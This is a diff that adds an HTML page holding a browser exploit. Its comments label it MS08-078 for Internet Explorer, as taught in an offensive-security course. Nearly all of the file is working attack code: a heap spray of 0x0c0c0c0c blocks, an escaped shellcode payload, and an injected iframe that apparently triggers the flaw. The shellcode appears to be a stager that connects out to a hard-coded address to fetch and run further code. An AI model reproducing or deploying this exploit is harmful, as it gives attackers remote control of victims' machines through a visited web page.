@@ -1,0 +1,28 @@
+<html>
+<script>
+	// MS08-078, as taught in OFFSEC's 2009 AWE, not even published on exploit-db, I don't think
+	// author: Charles Truscott @r0ss1n1
+	// I love you Alison Thompson OAM
+
+	// r0ss1n1.html && iframe.html, vim r0ss1n1.html
+
+	function alloc(bytes, mystr) {
+
+		var shellcode = unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u6ad5%u590b%ue250%u6afd%u6a01%u6802%u0fea%ue0df%ud5ff%u6897%u0002%u5000%ue689%u106a%u5756%uc268%u37db%uff67%u85d5%u75c0%u5758%ub768%u38e9%uffff%u57d5%u7468%u3bec%uffe1%u57d5%u6897%u6e75%u614d%ud5ff%u006a%u046a%u5756%u0268%uc8d9%uff5f%u83d5%u00f8%u2d7e%u368b%u406a%u0068%u0010%u5600%u006a%u5868%u53a4%uffe5%u93d5%u6a53%u5600%u5753%u0268%uc8d9%uff5f%u83d5%u00f8%u077e%uc301%uc629%ue975%ubbc3%ub5f0%u56a2%u006a%uff53%u41d5");
+		while (mystr.length < bytes) mystr += mystr;
+		return mystr.substr(0, (bytes-6)/2) + shellcode;
+	}
+
+	var evil = new Array();
+	var FAKEOBJ = unescape("%u0c0c%u0c0c");
+	FAKEOBJ = alloc(133120, FAKEOBJ);
+
+	// Perform 10 allocations of 1200 bytes on the heap
+
+	for (var k = 0; k < 1000; k++) {
+		evil[k] = FAKEOBJ.substr(0, FAKEOBJ.length);
+	}
+
+	document.write("<iframe src=\"iframe.html\">");
+</script>
+</html>
